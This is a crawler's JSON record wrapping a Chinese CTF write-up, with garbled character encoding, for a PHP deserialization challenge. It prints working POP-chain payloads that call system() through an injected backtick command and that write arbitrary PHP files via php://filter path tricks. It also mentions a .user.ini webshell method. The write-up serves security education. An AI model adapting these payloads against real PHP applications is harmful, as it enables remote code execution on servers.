{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-19 02:06:39","updatedTime":"2020-10-19 02:06:39","title":"BUUCTF 2020 æ–°æ˜¥çº¢åŒ…é¢˜1 Writeup","link":"https://www.zhaoj.in/?p=6397","description":"\n<h4>ä¸€ã€å‰è¨€</h4>\n\n\n\n<p>åŸæœ¬æƒ³ç€è¿‡å¹´äº†æææ´»åŠ¨å•¥çš„ï¼Œè¯´ä»æ—¥æœ¬å›æ¥å‡ºä¸‰ä¸ªé¢˜ç»™å¤§å®¶å‘å‘çº¢åŒ…çš„ï¼Œç»“æœäº‹æƒ…æŒºå¤šçš„ï¼Œæäº†ä¸€ä¸ªé¢˜æ”¾å‡ºæ¥å…ˆè®©å¤§å®¶ç©ç©ã€‚</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img loading=\"lazy\" width=\"655\" height=\"1024\" src=\"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png\" alt=\"\" class=\"wp-image-6398\" srcset=\"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png 655w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-192x300.png 192w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-768x1201.png 768w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-982x1536.png 982w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54.png 1028w\" sizes=\"(max-width: 655px) 100vw, 655px\" /></figure>\n\n\n\n<h4>äºŒã€è§£é¢˜æƒ…å†µ</h4>\n\n\n\n<p>æœ€ç»ˆåœ¨æˆªæ­¢æ—¶é—´ä¹‹å‰æœ‰ 19 ä½åŒå­¦åšå‡ºæ¥ï¼Œå…¶ä¸­ç¬¬ä¸€ä½åŒå­¦åœ¨é¢˜ç›®æ”¾å‡ºä¸¤ä¸ªå°æ—¶ä¹‹åå°±åšå‡ºæ¥äº†ï¼Œå¾ˆèµ<img src=\"https://s.w.org/images/core/emoji/13.0.0/72x72/1f44d.png\" alt=\"ğŸ‘\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img loading=\"lazy\" width=\"559\" height=\"1024\" src=\"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-559x1024.png\" alt=\"\" class=\"wp-image-6399\" srcset=\"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-559x1024.png 559w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-164x300.png 164w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-768x1407.png 768w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-839x1536.png 839w, https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365.png 1032w\" sizes=\"(max-width: 559px) 100vw, 559px\" /></figure>\n\n\n\n<h4>ä¸‰ã€Writeup</h4>\n\n\n\n<p>æ¥ä¸‹æ¥å°±æ˜¯ Writeup äº†ï¼Œè¿‡ç€å¹´äº‹æƒ…æŒºå¤šçš„ï¼Œå°±æŠŠå¤§å®¶ç”¨åˆ°çš„æ–¹æ³•ç®€ç•¥å†™ä¸€ä¸‹äº†ã€‚</p>\n\n\n\n<p>æœ¬é¢˜æ”¹ç¼–è‡ª EIS 2019 çš„ ezpopï¼Œé‚£æ—¶å€™åœ¨åšé¢˜çš„æ—¶å€™å‘ç°äº†å¦å¤–ä¸€ç§è§£æ³•ï¼Œä½†äº‹åå‘ç°æ²¡äººå°±ç€é‚£ç§æ–¹æ³•å†™ wpï¼Œæ‰€ä»¥å°±æš‚æ—¶æç½®ä¸‹æ¥ç•™ç€ä»¥åæ‹¿æ¥ç”¨ç”¨ã€‚</p>\n\n\n\n<p>åœ¨è¿™é‡Œå’ŒåŸé¢˜ä¸åŒçš„æ˜¯åŠ äº†ä¸‹é¢è¿™ä¸ªï¼Œå¯¹æ–‡ä»¶åæœ‰æ‰€æ§åˆ¶ã€‚</p>\n\n\n\n<pre class=\"wp-block-code\"><code>public function getCacheKey(string $name): string {\n        // ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº\n        $cache_filename = $this->options&#91;'prefix'] . uniqid() . $name;\n        if(substr($cache_filename, -strlen('.php')) === '.php') {\n            die('?');\n        }\n        return $cache_filename;\n    }</code></pre>\n\n\n\n<p>åŸé¢˜ Writeupï¼š<a href=\"http://www.rayi.vip/2019/11/27/EIS%202019/\">http://www.rayi.vip/2019/11/27/EIS%202019/</a></p>\n\n\n\n<h5>1ã€é¢„æœŸè§£</h5>\n\n\n\n<p>ä½¿ç”¨å¦‚ä¸‹çš„ Payloadï¼ˆå‰é¢ç±»å®šä¹‰çœç•¥ï¼Œè‡ªå·±å¤åˆ¶ï¼‰:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$testB = new B();\n$testB->options&#91;'prefix'] = 'abc';\n$testB->options&#91;'serialize'] = 'system';\n$testB->options&#91;'data_compress'] = false;\n$testB->options&#91;'expire'] = \"aaa\\n\";\n$testB->writeTimes = 0;\n$testA = new A($testB, \"miao\");\n$testA->autosave = false;\n$testA->cache = &#91;'aaq' => '`cat /flag > ./flag.php`'];\n$testA->complete = true;\n\necho urlencode(serialize($testA)).\"\\n\";\n</code></pre>\n\n\n\n<p>å…³é”®åœ¨ serialize å’Œ cache é‡Œçš„å‘½ä»¤é‚£ï¼Œ</p>\n\n\n\n<p>åˆ°æºç ä¸­çš„</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$data = $this->serialize($value);</code></pre>\n\n\n\n<p>æ­¤å¤„å³å¯è°ƒç”¨ä»»æ„å‡½æ•°å¹¶ä¸”ä¼ å‚ï¼Œå³ä¾¿å‚æ•°åœ¨ä¸Šé¢</p>\n\n\n\n<pre class=\"wp-block-code\"><code>return json_encode(&#91;$cleaned, $this->complete]);</code></pre>\n\n\n\n<p>è¢« json ç¼–ç äº†ï¼Œä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥åœ¨å…¶ä¸­æ’å…¥ä¸€æ®µå®Œæ•´çš„å†…å®¹ï¼Œæ‰€ä»¥æ’å…¥ä¸€æ®µç”¨åå¼•å·`æ‹¬èµ·æ¥çš„å‘½ä»¤ï¼Œç”±äºæ•´æ®µä¸œè¥¿ä¼ å…¥ system å‡½æ•°ä¹‹åæ˜¯è°ƒç”¨ shell æ¥æ‰§è¡Œï¼Œæ‰§è¡Œé¡ºåºæœ‰å…ˆåï¼Œåå¼•å·å†…çš„ä¼šè¢«å…ˆæ‰§è¡Œï¼Œå³å¯è¾¾åˆ°æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ã€‚</p>\n\n\n\n<p>æ›´å¤šä¿¡æ¯å¯ä»¥å‚è€ƒ <a href=\"https://www.anquanke.com/post/id/194036\">https://www.anquanke.com/post/id/194036</a> ã€‚</p>\n\n\n\n<h5>2ã€å…¶ä»–è§£æ³•1</h5>\n\n\n\n<p>ä¸ºäº†é™ä½éš¾åº¦ï¼Œæ–‡ä»¶åé‚£é‡Œæ²¡æœ‰å°æ­»ï¼Œäºæ˜¯å°±ç»™äº†å¤§å®¶å¾ˆå¤šå‘æŒ¥çš„ç©ºé—´ã€‚</p>\n\n\n\n<p>å¯¹äºå‰é¢çš„éšæœºå€¼ï¼Œä½¿ç”¨/../å³å¯æˆªæ–­ï¼Œåé¢å³å¯è¿½åŠ å†™ä»»æ„æ–‡ä»¶ã€‚</p>\n\n\n\n<p>äºæ˜¯å…ˆå†™ä¸€ä¸ª .user.iniï¼Œç„¶åå†™ä¸€ä¸ª .jpg é‡Œé¢å¸¦é©¬ï¼Œä½¿å…¶è¿½åŠ åˆ°å…¶ä»– php åé¢ä½œä¸º php æ‰§è¡Œå³å¯ã€‚</p>\n\n\n\n<p>å‚è§ <a href=\"http://althims.com/2020/01/29/buu-new-year/\">http://althims.com/2020/01/29/buu-new-year/</a></p>\n\n\n\n<h5>3ã€å…¶ä»–è§£æ³•2</h5>\n\n\n\n<p>å’Œä¸Šé¢å¤§åŒå°å¼‚ï¼Œä¹Ÿæ˜¯ä»»æ„å†™æ–‡ä»¶çš„é”…ï¼Œè¿™é‡Œå¯¹äºå°¾éƒ¨ .php çš„é™åˆ¶ï¼Œå¯ä½¿ç”¨è¿½åŠ  /. æ¥ç»•è¿‡ã€‚</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$testB = new B();\n$testA = new A($testB, $key = '/../miao1.php/.');\n$testA->complete = true;\n$testA->autosave = false;\n// &#60;?php phpinfo();?\\>\n$testA->cache = array(\"PD9waHAgcGhwaW5mbygpOz8+\"=>\"\");\n$testB->options&#91;'prefix'] = 'php://filter/write=string.strip_tags|convert.base64-decode/resource=';\n$testB->options&#91;'serialize'] = 'strval';\n$testB->options&#91;'data_compress'] = false;\n$testB->options&#91;'expire'] = \"aaa\\n\";\n$testB->writeTimes = 0;\n\necho urlencode(serialize($testA)).\"\\n\";</code></pre>\n\n\n\n<p>æ›´å¤šæ–¹æ³•ï¼Œæ¬¢è¿è¡¥å……ã€‚</p>\n\n\n\n<p></p>\n\n\n\n<p>é¢„å‘Šï¼šä»Šæ™šï¼ˆ2020å¹´01æœˆ29æ—¥ï¼‰æ™šå…«ç‚¹å¼€æ”¾ MISC æ–°æ˜¥çº¢åŒ…é¢˜ã€‚</p>\n","descriptionType":"html","publishedDate":"Wed, 29 Jan 2020 08:20:48 +0000","feedId":32607,"bgimg":"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png","linkMd5":"7a73984963546cd9b4c81860b2e96cdb","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn59@2020_4/2020/10/18/18-06-43-834_82208a8deb4d328f.webp","destWidth":655,"destHeight":1024,"sourceBytes":385266,"destBytes":47320,"author":"glzjin","articleImgCdnMap":{"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn59@2020_4/2020/10/18/18-06-43-834_82208a8deb4d328f.webp","https://s.w.org/images/core/emoji/13.0.0/72x72/1f44d.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn68@2020_4/2020/10/18/18-06-45-249_40c3fe9c532ac380.webp","https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-559x1024.png":null},"publishedOrCreatedDate":1603044399555}],"record":{"createdTime":"2020-10-19 02:06:39","updatedTime":"2020-10-19 02:06:39","feedId":32607,"fetchDate":"Sun, 18 Oct 2020 18:06:39 +0000","fetchMs":2438,"handleMs":39,"totalMs":73767,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"8260fd2369d630e6757423393ed6aac1","hostName":"europe65*","requestId":"44a4e6e4735c41cba2d6031e90e76f7e_32607","contentType":"application/rss+xml; charset=UTF-8","totalBytes":48624,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":3,"articlesImgsGithubTotal":2,"successGithubMap":{"myreaderx15":1,"myreaderx27":1},"failGithubMap":{"myreaderx19":1}},"feed":{"createdTime":"2020-09-07 02:56:06","updatedTime":"2020-09-07 05:06:43","id":32607,"name":"èµµ","url":"https://www.zhaoj.in/feed","subscriber":98,"website":null,"icon":"https://www.zhaoj.in/wp-content/uploads/2015/09/63a31fbec65e6094-32x32.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn28@2020_1/2020/09/06/21-06-35-407_9063ea448df71f2f.png","description":"è¥¿å…´è¡—é“ç‰©ç†å®‰å…¨ç ”ç©¶å‘˜ / åŸå­¦ç”Ÿ@åŒ—äº¬è”åˆå¤§å­¦/ä¿¡æ¯å®‰å…¨çˆ±å¥½è€… / å…¨æ ˆå¼€å‘ / ä¸ºå¿ƒä¸­çš„ç¾å¥½è€Œæˆ˜","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-10-19 02:07:50","updatedTime":"2020-10-19 02:07:50","id":null,"feedId":32607,"linkMd5":"7a73984963546cd9b4c81860b2e96cdb"}],"tmpCommonImgCdnBytes":47320,"tmpBodyImgCdnBytes":1304,"tmpBgImgCdnBytes":0,"extra4":{"start":1603044396361,"total":0,"statList":[{"spend":3155,"msg":"è·å–xmlå†…å®¹"},{"spend":39,"msg":"è§£é‡Šæ–‡ç« "},{"spend":0,"msg":"ä¸Šä¼ å°é¢å›¾åˆ°cdn"},{"spend":0,"msg":"ä¿®æ­£å°é¢å›¾ä¸Šä¼ å¤±è´¥é‡æ–°ä¸Šä¼ "},{"spend":65075,"msg":"æ­£æ–‡é“¾æ¥ä¸Šä¼ åˆ°cdn"}]},"extra5":3,"extra6":3,"extra7ImgCdnFailResultVector":[null,{"code":1,"isDone":false,"source":"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277464e7644568f7fe414b54f372da0b2d7365-559x1024.png","sourceStatusCode":200,"destWidth":559,"destHeight":1024,"sourceBytes":152776,"destBytes":23998,"targetWebpQuality":75,"feedId":32607,"totalSpendMs":3372,"convertSpendMs":34,"createdTime":"2020-10-19 02:07:46","host":"us-022*","referer":"https://www.zhaoj.in/?p=6397","linkMd5ListStr":"7a73984963546cd9b4c81860b2e96cdb","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx19/cdn70/contents/2020/10/18/18-07-49-407_c0a34256be4a430e.webp","resp":{"code":409,"msg":"Conflict","body":"{\n  \"message\": \"is at 9912e6fa033952d42992715b23427143289bdabe but expected d59254b933917d27841869ddbdf856133330f718\",\n  \"documentation_url\": \"https://docs.github.com/rest/reference/repos#create-or-update-file-contents\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-length":["222"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 18 Oct 2020 18:07:50 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["409 Conflict"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":[""],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8348:6735:1A3D9F0:3C10810:5F8C8473"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["5000"],"x-ratelimit-remaining":["4857"],"x-ratelimit-reset":["1603047730"],"x-ratelimit-used":["143"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 409,url is : https://api.github.com/repos/myreaderx19/cdn70/contents/2020/10/18/18-07-49-407_c0a34256be4a430e.webp","historyStatusCode":[],"spendMs":680},"base64UserPassword":null,"token":"e7085******************************e4b8c"},"githubUser":"myreaderx19","githubHttpCode":409,"extra22GetBytesInfo":"1ã€æ²¡æœ‰Refererå­—æ®µ","extra23historyStatusCode":[200],"sourceSize":"149.2 KB","destSize":"23.4 KB","compressRate":"15.7%"}],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-021.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-022.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://www.zhaoj.in/wp-content/uploads/2020/01/1580277423e98f7a003566ba3bd38d93b101e04a54-655x1024.png","sourceStatusCode":200,"destWidth":655,"destHeight":1024,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn59@2020_4/2020/10/18/18-06-43-834_82208a8deb4d328f.webp","sourceBytes":385266,"destBytes":47320,"targetWebpQuality":75,"feedId":32607,"totalSpendMs":5468,"convertSpendMs":35,"createdTime":"2020-10-19 02:06:39","host":"europe69*","referer":"https://www.zhaoj.in/?p=6397","linkMd5ListStr":"7a73984963546cd9b4c81860b2e96cdb,7a73984963546cd9b4c81860b2e96cdb","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1ã€æ²¡æœ‰Refererå­—æ®µ","extra23historyStatusCode":[200],"sourceSize":"376.2 KB","destSize":"46.2 KB","compressRate":"12.3%"},{"code":1,"isDone":false,"source":"https://s.w.org/images/core/emoji/13.0.0/72x72/1f44d.png","sourceStatusCode":200,"destWidth":72,"destHeight":72,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn68@2020_4/2020/10/18/18-06-45-249_40c3fe9c532ac380.webp","sourceBytes":778,"destBytes":1304,"targetWebpQuality":75,"feedId":32607,"totalSpendMs":861,"convertSpendMs":6,"createdTime":"2020-10-19 02:06:45","host":"us-022*","referer":"https://www.zhaoj.in/?p=6397","linkMd5ListStr":"7a73984963546cd9b4c81860b2e96cdb","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1ã€æ²¡æœ‰Refererå­—æ®µ","extra23historyStatusCode":[200],"sourceSize":"778 B","destSize":"1.3 KB","compressRate":"167.6%"}],"successGithubMap":{"myreaderx15":1,"myreaderx27":1},"failGithubMap":{"myreaderx19":1}}